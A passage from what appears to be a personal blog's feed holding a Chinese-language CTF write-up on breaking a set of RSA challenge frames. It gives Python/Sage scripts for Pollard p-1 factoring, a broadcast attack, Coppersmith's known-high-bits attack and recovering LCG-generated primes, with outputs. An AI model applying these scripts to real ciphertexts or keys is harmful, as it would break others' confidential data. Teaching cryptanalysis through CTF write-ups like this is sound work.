n$</li><li>计算$d = gcd(a-1,n)$</li><li>如果$1&lt;d&lt;n$, 则返回$d$</li></ul></li></ul><p><strong>exp</strong></p><p>优化前</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> GCD</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pollard_p_1</span><span class="params">(n,B)</span>:</span></span><br><span class="line">    a = <span class="number">2</span></span><br><span class="line">    d = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">2</span>,B+<span class="number">1</span>):</span><br><span class="line">        a = pow(a, j, n)</span><br><span class="line">        d = GCD(a<span class="number">-1</span>, n)</span><br><span class="line">        <span class="keyword">if</span> <span class="number">1</span>&lt;d&lt;n:</span><br><span class="line">            <span class="keyword">return</span> d</span><br></pre></td></tr></table></figure><p>优化后</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> GCD</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pollard_p_1</span><span class="params">(n,B)</span>:</span></span><br><span class="line">    a = <span class="number">2</span></span><br><span class="line">    false_range = int(<span class="number">0.8</span>*B)</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">2</span>,false_range):</span><br><span class="line">        a = pow(a, j, n)</span><br><span class="line"></span><br><span class="line">    d = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(false_range,B+<span class="number">1</span>):</span><br><span class="line">        a = pow(a, j, n)</span><br><span class="line">        d = GCD(a<span class="number">-1</span>, n)</span><br><span class="line">        <span class="keyword">if</span> <span class="number">1</span>&lt;d&lt;n:</span><br><span class="line">            <span class="keyword">return</span> d</span><br></pre></td></tr></table></figure><p><strong>结果</strong></p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">2</span><br><span class="line">b'<span class="symbol">\x</span>98vT2<span class="symbol">\x</span>10<span class="symbol">\x</span>ab<span class="symbol">\x</span>cd<span class="symbol">\x</span>ef<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>06<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00 That is'</span><br><span class="line">19</span><br><span class="line">b'<span class="symbol">\x</span>98vT2<span class="symbol">\x</span>10<span class="symbol">\x</span>ab<span class="symbol">\x</span>cd<span class="symbol">\x</span>ef<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>05<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00instein.'</span><br><span class="line">6</span><br><span class="line">b'<span class="symbol">\x</span>98vT2<span class="symbol">\x</span>10<span class="symbol">\x</span>ab<span class="symbol">\x</span>cd<span class="symbol">\x</span>ef<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>07<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00 "Logic '</span><br></pre></td></tr></table></figure><h2 id="frame3-8-12-16-20"><a href="#frame3-8-12-16-20" class="headerlink" title="frame3,8,12,16,20"></a>frame3,8,12,16,20</h2><p>Broadcast Attack</p><p><strong>前提条件</strong></p><p>e很小</p><p>大于e个人,使用相同的e对同一m进行加密,否则无法正确解密</p><script type="math/tex; mode=display">\because m<n \\\\\therefore m^e<N = n_1\cdot n_2 \cdots \cdot n_e \\\\</script><p><strong>攻击原理</strong></p><p>选取了相同的加密指数 e（这里取 e=3），对相同的明文 m 进行了加密并进行了消息的传递，那么有：</p><script type="math/tex; mode=display">c_1 \equiv m^3 \pmod {n_1} \\\\c_2 \equiv m^3 \pmod {n_2} \\\\c_3 \equiv m^3 \pmod {n_3} \\\\</script><p>对上述等式运用中国剩余定理，在 e=3 时，可以得到：</p><script type="math/tex; mode=display">N = n_1\cdot n_2\cdot n_3 \\\\c_x \equiv m^3 \pmod N</script><p>通过对 $c_x$ 进行三次开方就可以求得明文</p><p><strong>结果</strong></p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b'<span class="symbol">\x</span>98vT2<span class="symbol">\x</span>10<span class="symbol">\x</span>ab<span class="symbol">\x</span>cd<span class="symbol">\x</span>ef<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>01<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00t is a f'</span><br></pre></td></tr></table></figure><h2 id="frame7-11-15"><a href="#frame7-11-15" class="headerlink" title="frame7,11,15"></a>frame7,11,15</h2><p>Known High Bits Message Attack</p><p><strong>前提条件</strong></p><ul><li>已知明文 $m$ 的高位,记为 $m_0$</li><li>$e$比较小</li></ul><p><strong>原理</strong></p><script type="math/tex; mode=display">\because c \equiv (m_0+x)^e \pmod n \\\\set \  f(x) = (m+x)^e - c \\\\\therefore 存在 x , \  s.t. f(x) = k\cdot n (k = 0,1,2,...)</script><p>求解出x后,依据coppersmith定理,可以求出剩下的所有明文部分</p><p><strong>exp</strong></p><blockquote><p>在本地的sage环境下运行</p><p>or</p><p><a href="https://sagecell.sagemath.org/" target="_blank" rel="noopener">sage在线运行环境</a></p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">n = <span class="number">155266493936043103849855199987896813716831986416707080645036022909153373110367007140301635144950634879983289720164117794783088845393686109145443728632527874768524615377182297125716276153800765906014206797548230661764274997562670900115383324605843933035314110752560290540848152237316752573471110899212429555149</span></span><br><span class="line">c = <span class="number">124929943232081828105808318993257526364596580021564021377503915670544445679836588765369503919311404328043203272693851622132258819278328852726005776082575583793735570095307898828254568015886630010269615546857335790791577865565021730890364239443651479580968112031521485174068731577348690810906553798608040451024</span></span><br><span class="line">e = <span class="number">3</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 枚举可能的tag</span></span><br><span class="line">m_lst = []</span><br><span class="line">s = <span class="string">"9876543210abcdef0000000b00000000000000000000000000000000000000000000000000000000000000000000000000000000000000002e20496d6167696e"</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="string">"1234567890abcdef"</span>:</span><br><span class="line">    m_lst.append(eval(<span class="string">'0x'</span>+s[:<span class="number">23</span>]+i+s[<span class="number">24</span>:]))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 破解</span></span><br><span class="line"><span class="keyword">for</span> m <span class="keyword">in</span> m_lst:</span><br><span class="line">    <span class="comment"># 获取m中已知部分,未知部分用0替代</span></span><br><span class="line">    nbits = <span class="number">512</span></span><br><span class="line">    kbits = <span class="number">64</span></span><br><span class="line">    mbar = m&amp;(pow(<span class="number">2</span>,nbits)-pow(<span class="number">2</span>,kbits))</span><br><span class="line"></span><br><span class="line">    <span class="comment">#Zmod(n):Zmod代表这是一个整数域中的n模环</span></span><br><span class="line">    <span class="comment">#PolynomialRing：这个就是说建立多项式环</span></span><br><span class="line">    <span class="comment">#.&lt;X&gt;：指定一个变量</span></span><br><span class="line">    PR.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">    f = (mbar + x)**e - c</span><br><span class="line">    <span class="comment"># small_roots ( self , X = None , beta = 1.0 , epsilon = None , ** kwds )</span></span><br><span class="line">    <span class="comment"># X – 根的绝对边界</span></span><br><span class="line">    roots = f.small_roots()</span><br><span class="line">    <span class="keyword">if</span> roots: </span><br><span class="line">        print(bytes.fromhex(hex(mbar+roots[<span class="number">0</span>])[<span class="number">2</span>:]))</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p><strong>结果</strong></p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">- 7</span><br><span class="line">b'<span class="symbol">\x</span>98vT2<span class="symbol">\x</span>10<span class="symbol">\x</span>ab<span class="symbol">\x</span>cd<span class="symbol">\x</span>ef<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>02<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00amous sa'</span><br><span class="line">- 11</span><br><span class="line">b'<span class="symbol">\x</span>98vT2<span class="symbol">\x</span>10<span class="symbol">\x</span>ab<span class="symbol">\x</span>cd<span class="symbol">\x</span>ef<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>03<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00ying of '</span><br><span class="line">- 15</span><br><span class="line">b'<span class="symbol">\x</span>98vT2<span class="symbol">\x</span>10<span class="symbol">\x</span>ab<span class="symbol">\x</span>cd<span class="symbol">\x</span>ef<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>04<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00Albert E'</span><br></pre></td></tr></table></figure><h2 id="frame0-5-7-18-20"><a href="#frame0-5-7-18-20" class="headerlink" title="frame0-5,7-18,20"></a>frame0-5,7-18,20</h2><p><strong>原理</strong></p><p>线性同余方程为 $lcg[i]=(a*lcg[i-1]+b)%m$</p><p><strong>过程</strong></p><p>16bit为一组</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 使用f1的p作为例子</span></span><br><span class="line">p = bin(<span class="number">7273268163465293471933643674908027120929096536045429682300347130226398442391418956862476173798834057392247872274441320512158525416407044516675402521694747</span>)[<span class="number">2</span>:]</span><br><span class="line">print(len(p))</span><br><span class="line">block_size = <span class="number">16</span></span><br><span class="line">chunk = [p[i:i+block_size] <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(p),block_size)]</span><br><span class="line">print(chunk)</span><br><span class="line">print(len(chunk))</span><br></pre></td></tr></table></figure><figure class="highlight scheme"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">512</span></span><br><span class="line">[<span class="symbol">'1000101011011110</span>', <span class="symbol">'1111111010000101</span>', <span class="symbol">'1110001110100000</span>', <span class="symbol">'1000101100011111</span>', <span class="symbol">'0101101100110010</span>', <span class="symbol">'0000011001001001</span>', <span class="symbol">'1111011000010100</span>', <span class="symbol">'1101101010000011</span>', <span class="symbol">'1000110011000110</span>', <span class="symbol">'1011011001001101</span>', <span class="symbol">'1110101111001000</span>', <span class="symbol">'0010110000100111</span>', <span class="symbol">'1111001110011010</span>', <span class="symbol">'0101001010010001</span>', <span class="symbol">'1011100010111100</span>', <span class="symbol">'0110010000001011</span>', <span class="symbol">'1010001110101110</span>', <span class="symbol">'0101111100010101</span>', <span class="symbol">'1001000011110000</span>', <span class="symbol">'1010011000101111</span>', <span class="symbol">'1111000100000010</span>', <span class="symbol">'1001111111011001</span>', <span class="symbol">'1110100001100100</span>', <span class="symbol">'0101011010010011</span>', <span class="symbol">'0110111110010110</span>', <span class="symbol">'0001100011011101</span>', <span class="symbol">'0111001100011000</span>', <span class="symbol">'0001100100110111</span>', <span class="symbol">'1111001101101010</span>', <span class="symbol">'0000111000100001</span>', <span class="symbol">'0010010100001100</span>', <span class="symbol">'1101001000011011</span>']</span><br><span class="line"><span class="number">32</span></span><br></pre></td></tr></table></figure><p>计算a,b</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># calculate the a,b</span></span><br><span class="line">x = int(chunk[<span class="number">0</span>],<span class="number">2</span>)</span><br><span class="line">y = int(chunk[<span class="number">1</span>],<span class="number">2</span>)</span><br><span class="line">z = int(chunk[<span class="number">2</span>],<span class="number">2</span>)</span><br><span class="line">m = pow(<span class="number">2</span>,block_size)</span><br><span class="line">a = (z-y)*inverse(y-x,m)%m</span><br><span class="line">b = (y-a*x)%m</span><br><span class="line">print(<span class="string">"a = &#123;&#125;,b = &#123;&#125;"</span>.format(a,b-m))</span><br><span class="line">a = <span class="number">365</span>,b = <span class="number">-1</span></span><br></pre></td></tr></table></figure><p>验证a,b是否正确</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># verify the a,b</span></span><br><span class="line">x = int(chunk[<span class="number">0</span>],<span class="number">2</span>)</span><br><span class="line">print(x,<span class="string">"init"</span>,end=<span class="string">"\t"</span>)</span><br><span class="line">a = <span class="number">365</span></span><br><span class="line">b = <span class="number">-1</span></span><br><span class="line">m = pow(<span class="number">2</span>,block_size)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,len(chunk)):</span><br><span class="line">    y = (a*x+b)%m</span><br><span class="line">    x = y</span><br><span class="line">    <span class="keyword">if</span> y == int(chunk[i],<span class="number">2</span>):</span><br><span class="line">        print(y,<span class="string">"True"</span>,end=<span class="string">"\t"</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">"false"</span>,end=<span class="string">"\t"</span>)</span><br></pre></td></tr></table></figure><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">35550</span> <span class="string">init</span><span class="number">65157</span> <span class="literal">True</span><span class="number">58272</span> <span class="literal">True</span><span class="number">35615</span> <span class="literal">True</span><span class="number">23346</span> <span class="literal">True</span><span class="number">1609</span> <span class="literal">True</span><span class="number">62996</span> <span class="literal">True</span><span class="number">55939</span> <span class="literal">True</span><span class="number">36038</span> <span class="literal">True</span><span class="number">46669</span> <span class="literal">True</span><span class="number">60360</span> <span class="literal">True</span><span class="number">11303</span> <span class="literal">True</span><span class="number">62362</span> <span class="literal">True</span><span class="number">21137</span> <span class="literal">True</span><span class="number">47292</span> <span class="literal">True</span><span class="number">25611</span> <span class="literal">True</span><span class="number">41902</span> <span class="literal">True</span><span class="number">24341</span> <span class="literal">True</span><span class="number">37104</span> <span class="literal">True</span><span class="number">42543</span> <span class="literal">True</span><span class="number">61698</span> <span class="literal">True</span><span class="number">40921</span> <span class="literal">True</span><span class="number">59492</span> <span class="literal">True</span><span class="number">22163</span> <span class="literal">True</span><span class="number">28566</span> <span class="literal">True</span><span class="number">6365</span> <span class="literal">True</span><span class="number">29464</span> <span class="literal">True</span><span class="number">6455</span> <span class="literal">True</span><span class="number">62314</span> <span class="literal">True</span><span class="number">3617</span> <span class="literal">True</span><span class="number">9484</span> <span class="literal">True</span><span class="number">53787</span> <span class="literal">True</span></span><br></pre></td></tr></table></figure><p><strong>exp</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">crack_PRG</span><span class="params">(n)</span>:</span></span><br><span class="line">    a = <span class="number">365</span></span><br><span class="line">    b = <span class="number">-1</span></span><br><span class="line">    m = pow(<span class="number">2</span>,<span class="number">16</span>)</span><br><span class="line">    <span class="comment"># j: RandSeed</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(m):</span><br><span class="line">        x = j</span><br><span class="line">        p = bin(x)[<span class="number">2</span>:].zfill(<span class="number">16</span>)</span><br><span class="line">        <span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">63</span>):</span><br><span class="line">            y = (a*x+b)%m</span><br><span class="line">            x = y</span><br><span class="line">            p += bin(x)[<span class="number">2</span>:].zfill(<span class="number">16</span>)</span><br><span class="line">            <span class="keyword">if</span> n%int(p,<span class="number">2</span>) == <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">return</span> int(p,<span class="number">2</span>)</span><br><span class="line">            <span class="string">"""</span></span><br><span class="line"><span class="string">            p的长度不是16的整数倍,所以需要截断处理</span></span><br><span class="line"><span class="string">            效率极低,跑全部frame时,可将下述代码注释后执行</span></span><br><span class="line"><span class="string">            跑特定frame时,取消注释</span></span><br><span class="line"><span class="string">            """</span></span><br><span class="line"><span class="comment">#             if len(p) == 1024:</span></span><br><span class="line"><span class="comment">#                 for plen in range(513,576):</span></span><br><span class="line"><span class="comment">#                     temp = p[:plen]</span></span><br><span class="line"><span class="comment">#                     if n%int(temp,2) == 0:</span></span><br><span class="line"><span class="comment">#                         return int(temp,2)</span></span><br></pre></td></tr></table></figure><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.tr0y.wang/2017/11/06/CTFRSA/#%E4%BD%8E%E8%A7%A3%E5%AF%86%E6%8C%87%E6%95%B0%E6%94%BB%E5%87%BB" target="_blank" rel="noopener">RSA大礼包</a></p><p><a href="https://nonuplebroken.com/2019/11/21/RSA%20Coppersmith%E7%9B%B8%E5%85%B3%E6%94%BB%E5%87%BB/#factoring-with-high-bits-known" target="_blank" rel="noopener">coppersmith</a></p><p><a href="https://ctf-wiki.org/crypto/asymmetric/rsa/rsa_coppersmith_attack/#basic-broadcast-attack" target="_blank" rel="noopener">ctf-wiki</a></p><p><a href="https://weichujian.github.io/2020/05/28/lcg%E7%BA%BF%E6%80%A7%E5%90%8C%E4%BD%99%E9%9A%8F%E6%9C%BA%E6%95%B0%E7%94%9F%E6%88%90%E5%99%A8/" target="_blank" rel="noopener">lcg线性同余随机数生成器</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;RSA大礼包-wp&quot;&gt;&lt;a href=&quot;#RSA大礼包-wp&quot; class=&quot;headerlink&quot; title=&quot;RSA大礼包_wp&quot;&gt;&lt;/a&gt;RSA大礼包_wp&lt;/h1&gt;&lt;h2 id=&quot;frame0-4&quot;&gt;&lt;a href=&quot;#frame0-4&quot; class=&quot;
      
    
    </summary>
    
    
      <category term="密码学" scheme="https://mercer5.github.io/categories/%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
    
    
      <category term="密码学" scheme="https://mercer5.github.io/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
    
      <category term="算法" scheme="https://mercer5.github.io/tags/%E7%AE%97%E6%B3%95/"/>
    
      <category term="安全" scheme="https://mercer5.github.io/tags/%E5%AE%89%E5%85%A8/"/>
    
      <category term="XDU" scheme="https://mercer5.github.io/tags/XDU/"/>
    
  </entry>
  
  <entry>
    <title>padding oracle attack</title>
    <link href="https://mercer5.github.io/2022/01/06/padding-oracle-attack/"/>
    <id>https://mercer5.github.io/2022/01/06/padding-oracle-attack/</id>
    <published>2022-01-06T08:11:13.000Z</published>
    <updated>2022-01-07T06:17:45.161Z</updated>
    
